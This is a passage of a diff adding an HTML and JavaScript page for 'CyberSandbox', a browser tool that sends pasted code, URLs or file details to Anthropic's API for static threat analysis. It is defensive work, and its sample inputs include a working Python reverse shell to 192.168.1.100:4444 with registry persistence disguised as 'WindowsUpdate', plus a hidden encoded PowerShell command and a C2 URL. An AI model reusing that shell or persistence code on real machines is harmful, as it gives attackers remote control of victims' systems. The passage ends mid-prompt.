@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberSandbox — Threat Analysis Tool</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0d0f12;
+  --surface: #13161b;
+  --surface2: #1a1e25;
+  --surface3: #212630;
+  --border: #2a2f3a;
+  --border2: #343b49;
+  --text: #e8eaf0;
+  --text2: #8b91a0;
+  --text3: #555c6e;
+  --accent: #00e5a0;
+  --accent-dim: rgba(0,229,160,0.12);
+  --accent-dim2: rgba(0,229,160,0.06);
+  --red: #ff4d4d;
+  --red-dim: rgba(255,77,77,0.12);
+  --orange: #ff9a3c;
+  --orange-dim: rgba(255,154,60,0.12);
+  --yellow: #ffd166;
+  --yellow-dim: rgba(255,209,102,0.10);
+  --blue: #4d9fff;
+  --blue-dim: rgba(77,159,255,0.10);
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'Inter', system-ui, sans-serif;
+  --radius: 8px;
+  --radius-lg: 14px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.6;min-height:100vh}
+a{color:var(--accent);text-decoration:none}
+
+/* LAYOUT */
+.layout{display:grid;grid-template-columns:240px 1fr;min-height:100vh}
+.sidebar{background:var(--surface);border-right:1px solid var(--border);padding:0;display:flex;flex-direction:column;position:sticky;top:0;height:100vh;overflow-y:auto}
+.main{padding:2rem 2.5rem;max-width:860px}
+
+/* SIDEBAR */
+.logo{padding:1.5rem 1.25rem 1rem;border-bottom:1px solid var(--border)}
+.logo-mark{display:flex;align-items:center;gap:10px;margin-bottom:4px}
+.logo-icon{width:32px;height:32px;background:var(--accent);border-radius:8px;display:flex;align-items:center;justify-content:center}
+.logo-icon svg{width:18px;height:18px;fill:none;stroke:#0d0f12;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+.logo-name{font-size:15px;font-weight:600;letter-spacing:-.01em}
+.logo-sub{font-size:11px;color:var(--text3);font-family:var(--mono);letter-spacing:.05em;text-transform:uppercase}
+.nav{padding:1rem 0;flex:1}
+.nav-section{padding:0 1rem;margin-bottom:1.5rem}
+.nav-label{font-size:10px;font-weight:600;color:var(--text3);letter-spacing:.1em;text-transform:uppercase;margin-bottom:.5rem;padding:0 .25rem}
+.nav-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:var(--radius);cursor:pointer;font-size:13px;color:var(--text2);transition:all .15s;border:none;background:none;width:100%;text-align:left}
+.nav-item:hover{background:var(--surface2);color:var(--text)}
+.nav-item.active{background:var(--accent-dim);color:var(--accent)}
+.nav-item svg{width:16px;height:16px;flex-shrink:0;opacity:.7}
+.nav-item.active svg{opacity:1}
+.sidebar-footer{padding:1rem 1.25rem;border-top:1px solid var(--border)}
+.api-status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--accent);box-shadow:0 0 6px var(--accent);flex-shrink:0}
+.dot.offline{background:var(--red);box-shadow:0 0 6px var(--red)}
+
+/* PANELS */
+.panel{display:none}.panel.active{display:block}
+
+/* HEADER */
+.page-header{margin-bottom:2rem}
+.page-title{font-size:22px;font-weight:600;letter-spacing:-.02em;margin-bottom:4px}
+.page-desc{font-size:14px;color:var(--text2);line-height:1.6}
+
+/* CARDS */
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1.25rem 1.5rem;margin-bottom:1rem}
+.card-label{font-size:11px;font-weight:600;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.6rem}
+
+/* FORM ELEMENTS */
+textarea, input[type=text]{
+  width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px 14px;font-size:13px;color:var(--text);font-family:var(--mono);resize:vertical;
+  outline:none;transition:border-color .15s;line-height:1.7;
+}
+textarea:focus, input[type=text]:focus{border-color:var(--border2)}
+textarea::placeholder, input::placeholder{color:var(--text3)}
+
+/* TYPE PILLS */
+.pills{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1rem}
+.pill{padding:5px 12px;border-radius:20px;border:1px solid var(--border);background:none;cursor:pointer;font-size:12px;color:var(--text2);font-family:var(--sans);transition:all .15s}
+.pill:hover{border-color:var(--border2);color:var(--text)}
+.pill.active{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+
+/* BUTTONS */
+.btn-row{display:flex;gap:8px;margin-top:1rem;flex-wrap:wrap}
+.btn{padding:9px 20px;border-radius:var(--radius);border:1px solid var(--border2);background:none;cursor:pointer;font-size:13px;font-weight:500;color:var(--text);font-family:var(--sans);transition:all .15s;display:inline-flex;align-items:center;gap:7px}
+.btn:hover{background:var(--surface2)}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn.primary{background:var(--accent);color:#0d0f12;border-color:transparent}
+.btn.primary:hover:not(:disabled){background:#00cc8e}
+.btn.danger-btn{border-color:var(--red);color:var(--red)}
+.btn.danger-btn:hover{background:var(--red-dim)}
+.btn svg{width:15px;height:15px;flex-shrink:0}
+
+/* RESULTS */
+.result-wrap{display:none}
+.result-wrap.show{display:block}
+.verdict-bar{display:flex;align-items:center;gap:1.5rem;padding:1.25rem 1.5rem;border-radius:var(--radius-lg);border:1px solid var(--border);margin-bottom:1rem;background:var(--surface)}
+.score-block{text-align:center;flex-shrink:0}
+.score-num{font-size:48px;font-weight:600;font-family:var(--mono);line-height:1;letter-spacing:-.03em}
+.score-label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-top:2px}
+.verdict-info{flex:1}
+.verdict-badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;padding:4px 12px;border-radius:20px;margin-bottom:8px;letter-spacing:.02em;text-transform:uppercase}
+.verdict-summary{font-size:13px;color:var(--text2);line-height:1.7}
+.tags-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
+.tag{font-size:11px;padding:3px 10px;border-radius:4px;background:var(--blue-dim);color:var(--blue);border:1px solid rgba(77,159,255,.2);font-family:var(--mono)}
+
+/* FINDINGS */
+.section-title{font-size:11px;font-weight:600;color:var(--text3);letter-spacing:.1em;text-transform:uppercase;margin:1.5rem 0 .75rem}
+.finding{border:1px solid var(--border);border-radius:var(--radius);padding:12px 14px;margin-bottom:6px}
+.finding-header{display:flex;align-items:center;gap:8px;margin-bottom:5px}
+.finding-title{font-size:13px;font-weight:500}
+.finding-detail{font-size:13px;color:var(--text2);line-height:1.6}
+.sev-badge{font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px;letter-spacing:.06em;text-transform:uppercase;flex-shrink:0}
+.sev-critical{background:var(--red-dim);color:var(--red);border:1px solid rgba(255,77,77,.25)}
+.sev-high{background:var(--orange-dim);color:var(--orange);border:1px solid rgba(255,154,60,.25)}
+.sev-medium{background:var(--yellow-dim);color:var(--yellow);border:1px solid rgba(255,209,102,.25)}
+.sev-low{background:var(--accent-dim);color:var(--accent);border:1px solid rgba(0,229,160,.2)}
+.finding.sev-critical-card{border-left:3px solid var(--red)}
+.finding.sev-high-card{border-left:3px solid var(--orange)}
+.finding.sev-medium-card{border-left:3px solid var(--yellow)}
+.finding.sev-low-card{border-left:3px solid var(--accent)}
+
+/* IOCs */
+.ioc{font-family:var(--mono);font-size:12px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:7px 12px;margin-bottom:5px;color:var(--text2);word-break:break-all;display:flex;align-items:flex-start;gap:8px}
+.ioc-dot{width:6px;height:6px;border-radius:50%;background:var(--red);flex-shrink:0;margin-top:5px}
+
+/* REMEDIATION */
+.step{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-num{width:24px;height:24px;border-radius:50%;border:1px solid var(--accent);color:var(--accent);font-size:11px;font-weight:600;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;font-family:var(--mono)}
+.step-body strong{display:block;font-size:13px;font-weight:500;margin-bottom:2px}
+.step-body p{font-size:13px;color:var(--text2);line-height:1.6}
+
+/* LOADING */
+.loading-card{text-align:center;padding:2.5rem;border:1px solid var(--border);border-radius:var(--radius-lg);background:var(--surface)}
+.spinner{display:inline-block;width:20px;height:20px;border:2px solid var(--border2);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;margin-bottom:12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* HISTORY */
+.history-item{display:flex;align-items:center;gap:12px;padding:10px 14px;border:1px solid var(--border);border-radius:var(--radius);margin-bottom:6px;cursor:pointer;transition:border-color .15s}
+.history-item:hover{border-color:var(--border2)}
+.history-type{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--text3);font-family:var(--mono);min-width:40px}
+.history-text{font-size:13px;color:var(--text2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.history-score{font-size:13px;font-weight:600;font-family:var(--mono);flex-shrink:0}
+.empty-state{text-align:center;padding:3rem;color:var(--text3);font-size:13px}
+
+/* ABOUT */
+.about-section{margin-bottom:2rem}
+.about-section h2{font-size:16px;font-weight:600;margin-bottom:.75rem}
+.about-section p, .about-section li{font-size:14px;color:var(--text2);line-height:1.8}
+.about-section ul{padding-left:1.25rem}
+.feature-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem}
+.feature-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:1rem}
+.feature-card h3{font-size:13px;font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+.feature-card p{font-size:12px;color:var(--text2);line-height:1.6}
+.warn-box{background:var(--yellow-dim);border:1px solid rgba(255,209,102,.25);border-radius:var(--radius);padding:12px 14px;font-size:13px;color:var(--yellow);line-height:1.6;margin-top:1rem}
+
+/* SETTINGS */
+.settings-row{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--border)}
+.settings-row:last-child{border-bottom:none}
+.settings-label{font-size:14px;font-weight:500}
+.settings-desc{font-size:12px;color:var(--text3);margin-top:2px}
+.settings-control input[type=text]{width:220px;padding:7px 12px}
+.settings-control select{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:7px 12px;font-size:13px;color:var(--text);outline:none}
+input[type=password]{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:9px 12px;font-size:13px;color:var(--text);font-family:var(--mono);outline:none;transition:border-color .15s}
+input[type=password]:focus{border-color:var(--accent)}
+.save-btn-wrap{margin-top:1rem}
+.key-saved{font-size:12px;color:var(--accent);margin-left:10px;display:none}
+.key-saved.show{display:inline}
+
+/* MOBILE */
+@media(max-width:700px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{position:fixed;bottom:0;left:0;right:0;height:auto;flex-direction:row;border-right:none;border-top:1px solid var(--border);z-index:100}
+  .logo,.sidebar-footer,.nav-label{display:none}
+  .nav{display:flex;padding:.5rem;gap:2px}
+  .nav-section{margin:0;padding:0;display:flex;gap:2px}
+  .nav-section:first-child{flex:1}
+  .nav-item{flex-direction:column;gap:3px;font-size:10px;padding:6px 8px;justify-content:center;align-items:center;text-align:center}
+  .main{padding:1.25rem;padding-bottom:90px}
+  .feature-grid{grid-template-columns:1fr}
+  .verdict-bar{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+
+<div class="layout">
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="logo">
+      <div class="logo-mark">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+        <div>
+          <div class="logo-name">CyberSandbox</div>
+        </div>
+      </div>
+      <div class="logo-sub">Threat Analysis Tool</div>
+    </div>
+
+    <nav class="nav">
+      <div class="nav-section">
+        <div class="nav-label">Analyze</div>
+        <button class="nav-item active" onclick="showPanel('code')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+          Code / Script
+        </button>
+        <button class="nav-item" onclick="showPanel('url')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          URL / Website
+        </button>
+        <button class="nav-item" onclick="showPanel('file')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+          File Content
+        </button>
+      </div>
+      <div class="nav-section">
+        <div class="nav-label">Tools</div>
+        <button class="nav-item" onclick="showPanel('history')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          History
+        </button>
+        <button class="nav-item" onclick="showPanel('settings')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+          Settings
+        </button>
+        <button class="nav-item" onclick="showPanel('about')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          About
+        </button>
+      </div>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="api-status">
+        <div class="dot" id="status-dot"></div>
+        <span id="status-text">API ready</span>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- CODE PANEL -->
+    <div id="panel-code" class="panel active">
+      <div class="page-header">
+        <div class="page-title">Code & Script Analysis</div>
+        <div class="page-desc">Paste any suspicious script or code snippet to detect malicious behavior, backdoors, and vulnerabilities.</div>
+      </div>
+      <div class="card">
+        <div class="card-label">Language</div>
+        <div class="pills" id="code-pills">
+          <button class="pill active" onclick="setPill(this,'code')">Python</button>
+          <button class="pill" onclick="setPill(this,'code')">JavaScript</button>
+          <button class="pill" onclick="setPill(this,'code')">PowerShell</button>
+          <button class="pill" onclick="setPill(this,'code')">Bash / Shell</button>
+          <button class="pill" onclick="setPill(this,'code')">PHP</button>
+          <button class="pill" onclick="setPill(this,'code')">SQL</button>
+          <button class="pill" onclick="setPill(this,'code')">Other</button>
+        </div>
+        <div class="card-label">Code to analyze</div>
+        <textarea id="code-input" rows="10" placeholder="Paste suspicious code or script here..."></textarea>
+        <div class="btn-row">
+          <button class="btn primary" onclick="analyze('code')" id="btn-code">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Analyze code
+          </button>
+          <button class="btn" onclick="loadSample('code')">Load sample</button>
+          <button class="btn" onclick="clearPanel('code')">Clear</button>
+        </div>
+      </div>
+      <div id="result-code" class="result-wrap"></div>
+    </div>
+
+    <!-- URL PANEL -->
+    <div id="panel-url" class="panel">
+      <div class="page-header">
+        <div class="page-title">URL & Website Analysis</div>
+        <div class="page-desc">Analyze suspicious URLs for phishing patterns, typosquatting, malware distribution, and social engineering.</div>
+      </div>
+      <div class="card">
+        <div class="card-label">Suspicious URL</div>
+        <input type="text" id="url-input" placeholder="https://example-suspicious.xyz/login?redirect=paypal.com">
+        <div style="margin-top:1rem">
+          <div class="card-label">Context (optional)</div>
+          <textarea id="url-context" rows="3" placeholder="Where did you encounter this URL? e.g. Received in email, mimics bank login, requested credentials..."></textarea>
+        </div>
+        <div class="btn-row">
+          <button class="btn primary" onclick="analyze('url')" id="btn-url">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Analyze URL
+          </button>
+          <button class="btn" onclick="loadSample('url')">Load sample</button>
+          <button class="btn" onclick="clearPanel('url')">Clear</button>
+        </div>
+      </div>
+      <div id="result-url" class="result-wrap"></div>
+    </div>
+
+    <!-- FILE PANEL -->
+    <div id="panel-file" class="panel">
+      <div class="page-header">
+        <div class="page-title">File Content Analysis</div>
+        <div class="page-desc">Paste file contents, extracted strings, metadata, or behavioral indicators for malware classification.</div>
+      </div>
+      <div class="card">
+        <div class="card-label">File type</div>
+        <div class="pills" id="file-pills">
+          <button class="pill active" onclick="setPill(this,'file')">Unknown</button>
+          <button class="pill" onclick="setPill(this,'file')">EXE / DLL</button>
+          <button class="pill" onclick="setPill(this,'file')">PDF</button>
+          <button class="pill" onclick="setPill(this,'file')">Office doc</button>
+          <button class="pill" onclick="setPill(this,'file')">Archive</button>
+          <button class="pill" onclick="setPill(this,'file')">JS file</button>
+          <button class="pill" onclick="setPill(this,'file')">APK</button>
+        </div>
+        <div class="card-label">File content, strings, or metadata</div>
+        <textarea id="file-input" rows="10" placeholder="Paste file contents, hex strings, extracted metadata, behavioral report, or describe what the file does..."></textarea>
+        <div class="btn-row">
+          <button class="btn primary" onclick="analyze('file')" id="btn-file">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Analyze file
+          </button>
+          <button class="btn" onclick="loadSample('file')">Load sample</button>
+          <button class="btn" onclick="clearPanel('file')">Clear</button>
+        </div>
+      </div>
+      <div id="result-file" class="result-wrap"></div>
+    </div>
+
+    <!-- HISTORY PANEL -->
+    <div id="panel-history" class="panel">
+      <div class="page-header">
+        <div class="page-title">Analysis History</div>
+        <div class="page-desc">Recent analyses from this session.</div>
+      </div>
+      <div id="history-list"></div>
+    </div>
+
+    <!-- SETTINGS PANEL -->
+    <div id="panel-settings" class="panel">
+      <div class="page-header">
+        <div class="page-title">Settings</div>
+        <div class="page-desc">Configure your API key and preferences.</div>
+      </div>
+      <div class="card">
+        <div class="card-label">Anthropic API Key</div>
+        <p style="font-size:13px;color:var(--text2);margin-bottom:.75rem;line-height:1.6">Your key is stored in <code style="font-family:var(--mono);font-size:12px;color:var(--accent)">localStorage</code> only — never sent anywhere except directly to Anthropic's API.</p>
+        <input type="password" id="api-key-input" placeholder="sk-ant-...">
+        <div class="btn-row">
+          <button class="btn primary" onclick="saveKey()">Save key</button>
+          <button class="btn danger-btn" onclick="clearKey()">Remove key</button>
+          <span class="key-saved" id="key-saved">✓ Saved</span>
+        </div>
+        <p style="font-size:12px;color:var(--text3);margin-top:.75rem">Get your key at <a href="https://console.anthropic.com" target="_blank">console.anthropic.com</a></p>
+      </div>
+      <div class="card" style="margin-top:1rem">
+        <div class="card-label">Model</div>
+        <div class="settings-row">
+          <div>
+            <div class="settings-label">Analysis model</div>
+            <div class="settings-desc">Model used for threat analysis</div>
+          </div>
+          <div class="settings-control">
+            <select id="model-select">
+              <option value="claude-sonnet-4-6">Claude Sonnet 4.6 (recommended)</option>
+              <option value="claude-haiku-4-5-20251001">Claude Haiku 4.5 (faster)</option>
+              <option value="claude-opus-4-6">Claude Opus 4.6 (most thorough)</option>
+            </select>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ABOUT PANEL -->
+    <div id="panel-about" class="panel">
+      <div class="page-header">
+        <div class="page-title">About CyberSandbox</div>
+        <div class="page-desc">AI-powered static threat analysis for security research and education.</div>
+      </div>
+      <div class="warn-box">
+        ⚠ This tool performs <strong>static AI analysis only</strong> — it does not execute code, make live network requests to URLs, or detonate files. For live sandboxing, use dedicated tools like Any.run, Cuckoo, or VirusTotal.
+      </div>
+      <div class="feature-grid" style="margin-top:1.5rem">
+        <div class="feature-card">
+          <h3>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--accent)"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+            Code analysis
+          </h3>
+          <p>Detects reverse shells, obfuscated payloads, persistence mechanisms, credential harvesting, and injection attacks across Python, JS, PowerShell, Bash, PHP, and SQL.</p>
+        </div>
+        <div class="feature-card">
+          <h3>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--accent)"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+            URL / phishing detection
+          </h3>
+          <p>Identifies typosquatting, homograph attacks, suspicious redirect chains, credential harvest pages, and social engineering patterns.</p>
+        </div>
+        <div class="feature-card">
+          <h3>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--accent)"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+            File & malware analysis
+          </h3>
+          <p>Classifies malware families, identifies IOCs, registry persistence, C2 patterns, dropper behavior, and suspicious string indicators from file metadata or contents.</p>
+        </div>
+        <div class="feature-card">
+          <h3>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--accent)"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Structured output
+          </h3>
+          <p>Every analysis returns a threat score, severity-rated findings, indicators of compromise, MITRE ATT&CK tags, and step-by-step remediation guidance.</p>
+        </div>
+      </div>
+      <div class="about-section" style="margin-top:2rem">
+        <h2>Privacy</h2>
+        <p>Your API key is stored only in your browser's localStorage. All analysis requests go directly from your browser to Anthropic's API — no data is stored on any third-party server.</p>
+      </div>
+      <div class="about-section">
+        <h2>Hosting this app</h2>
+        <ul>
+          <li>Drop <code style="font-family:var(--mono);font-size:12px;color:var(--accent)">index.html</code> into any static hosting provider</li>
+          <li>Works on Netlify, GitHub Pages, Vercel, Cloudflare Pages, or any web server</li>
+          <li>No backend required — all API calls are made client-side</li>
+          <li>Each user provides their own Anthropic API key via Settings</li>
+        </ul>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// ── State ──
+let codeType = 'Python', fileType = 'Unknown';
+let history = [];
+
+// ── API key ──
+function getKey(){ return localStorage.getItem('csb_api_key') || ''; }
+function saveKey(){
+  const k = document.getElementById('api-key-input').value.trim();
+  if(!k){ alert('Please enter a valid API key.'); return; }
+  localStorage.setItem('csb_api_key', k);
+  const s = document.getElementById('key-saved');
+  s.classList.add('show');
+  setTimeout(()=>s.classList.remove('show'), 2500);
+  updateStatus();
+}
+function clearKey(){
+  localStorage.removeItem('csb_api_key');
+  document.getElementById('api-key-input').value = '';
+  updateStatus();
+}
+function updateStatus(){
+  const k = getKey();
+  const dot = document.getElementById('status-dot');
+  const txt = document.getElementById('status-text');
+  if(k){ dot.classList.remove('offline'); txt.textContent='API ready'; }
+  else { dot.classList.add('offline'); txt.textContent='No API key'; }
+}
+
+// ── Nav ──
+function showPanel(id){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+id).classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(b=>{
+    if(b.getAttribute('onclick')===`showPanel('${id}')`) b.classList.add('active');
+  });
+  if(id==='history') renderHistory();
+  if(id==='settings'){
+    const k=getKey();
+    if(k) document.getElementById('api-key-input').value=k;
+  }
+}
+
+// ── Pills ──
+function setPill(el, ctx){
+  const container = ctx==='code' ? document.getElementById('code-pills') : document.getElementById('file-pills');
+  container.querySelectorAll('.pill').forEach(p=>p.classList.remove('active'));
+  el.classList.add('active');
+  if(ctx==='code') codeType = el.textContent.trim();
+  else fileType = el.textContent.trim();
+}
+
+// ── Clear ──
+function clearPanel(t){
+  if(t==='code') document.getElementById('code-input').value='';
+  else if(t==='url'){ document.getElementById('url-input').value=''; document.getElementById('url-context').value=''; }
+  else document.getElementById('file-input').value='';
+  const r = document.getElementById('result-'+t);
+  r.classList.remove('show'); r.innerHTML='';
+}
+
+// ── Samples ──
+function loadSample(t){
+  if(t==='code'){
+    document.getElementById('code-input').value=
+`import subprocess, base64, os, socket
+
+# Reverse shell beacon
+def beacon(host='192.168.1.100', port=4444):
+    s = socket.socket()
+    s.connect((host, port))
+    while True:
+        cmd = s.recv(1024).decode()
+        if cmd == 'exit': break
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        s.send(base64.b64encode(out))
+    s.close()
+
+# Persistence via registry (Windows)
+import winreg
+key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+  r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, os.path.abspath(__file__))
+
+beacon()`;
+  } else if(t==='url'){
+    document.getElementById('url-input').value='http://paypa1-secure-login.ru/account/verify?token=abc123&redirect=paypal.com';
+    document.getElementById('url-context').value='Received in email claiming PayPal suspended my account. Sender was noreply@paypa1.ru. Urgently requested I verify within 24 hours.';
+  } else {
+    document.getElementById('file-input').value=
+`File: invoice_march.pdf.exe
+Size: 512 KB
+PE Header: Compiled 2024-01-15, UPX packed
+Detected strings:
+  - "C:\\Windows\\System32\\cmd.exe"
+  - "powershell -WindowStyle Hidden -EncodedCommand SQBFAFgA..."
+  - "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  - "http://malware-c2.xyz/payload/stage2"
+  - Drops: %TEMP%\\svchost32.exe
+  - Scheduled task: "Microsoft Update Service Helper"
+  - Hardcoded AES key: "4f8c2d1a9e3b7f6..."
+  - Contacts: 185.220.101.45:8080 (TOR exit node)
+  - Encrypted blob at offset 0x1A40 (size 48KB)`;
+    document.querySelectorAll('#file-pills .pill')[1].click();
+  }
+}
+
+// ── Analyze ──
+async function analyze(type){
+  const key = getKey();
+  if(!key){
+    alert('Please add your Anthropic API key in Settings first.');
+    showPanel('settings');
+    return;
+  }
+
+  let content='', context='';
+  if(type==='code'){
+    content = document.getElementById('code-input').value.trim();
+    context = codeType;
+  } else if(type==='url'){
+    content = document.getElementById('url-input').value.trim();
+    context = document.getElementById('url-context').value.trim();
+  } else {
+    content = document.getElementById('file-input').value.trim();
+    context = fileType;
+  }
+  if(!content){ alert('Please paste some content to analyze.'); return; }
+
+  const resultEl = document.getElementById('result-'+type);
+  const btn = document.getElementById('btn-'+type);
+  resultEl.classList.add('show');
+  resultEl.innerHTML=`<div class="loading-card"><div class="spinner"></div><br><span style="font-size:13px;color:var(--text2)">Running sandbox analysis…</span></div>`;
+  btn.disabled=true;
+
+  const model = document.getElementById('model-select')?.value || 'claude-sonnet-4-6';
+
+  const prompts = {
+    code:`You are a senior cybersecurity analyst. Analyze this ${context} code for threats, malicious behavior, and vulnerabilities in a sandbox context.
+
+Code:
+\`\`\`
+${content}
+\`\`\`
+
+Respond ONLY with valid JSON (no markdown fences, no preamble):
